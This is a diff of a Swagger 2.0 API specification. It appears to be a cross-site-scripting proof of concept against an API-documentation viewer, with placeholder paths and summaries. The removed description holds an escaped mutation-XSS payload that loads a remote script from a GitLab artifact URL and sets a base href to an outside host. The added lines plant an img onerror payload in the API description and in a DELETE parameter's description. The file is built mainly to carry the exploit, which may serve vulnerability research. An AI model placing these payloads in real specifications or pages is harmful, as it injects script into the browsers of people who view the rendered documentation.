@@ -1,20 +1,60 @@
-swagger: 2.0
+---
+swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: |  
-    &lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;textarea&gt;&lt;path id=&#34;&lt;/textarea&gt;&lt;a href=https://gitlab.com/yvvdwf/_/-/jobs/552156057/artifacts/raw/alert.js data-type=script style=&#39;cursor: default;overflow: visible;width: 1000px;position: fixed;height: 2000px;margin: 0;display: block;box-sizing: initial;&#39; data-remote=true class=&#39;atwho-view select2-drop-mask pika-select&#39;&gt;&lt;div style=&#39;width: 100vw;height: 100vh;position: fixed;&#39;&gt;&lt;/div&gt;&lt;/a&gt;&lt;base href=&#39;https://ec2.ap-east-1.amazonaws.com/XD/&#39;&gt;&#34;&gt;&lt;/form&gt;
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>
 
   version: production
-basePath: /
+basePath: https://afine.com
+produces:
+- application/xml
+- application/json
+consumes:
+- application/xml
+- application/json
 security:
-  - basicAuth: []
+- basicAuth: []
 paths:
-  /accounts:
+  "/afine":
     get:
       responses:
-        &#39;200&#39;:
+        '200':
           description: No response was specified
       tags:
-        - accounts
+      - somettext
       operationId: findAccounts
-      summary: Finds all accounts
+      summary: this is example text
+  "/malformed_by_afine":
+    delete:
+      parameters:
+      - description: |
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>
+
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - afine
+      operationId: afine
+      summary: afine
+    get:
+      parameters:
+      - description: this is example text
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - afine
+      operationId: some_operation
+      summary: this is example text
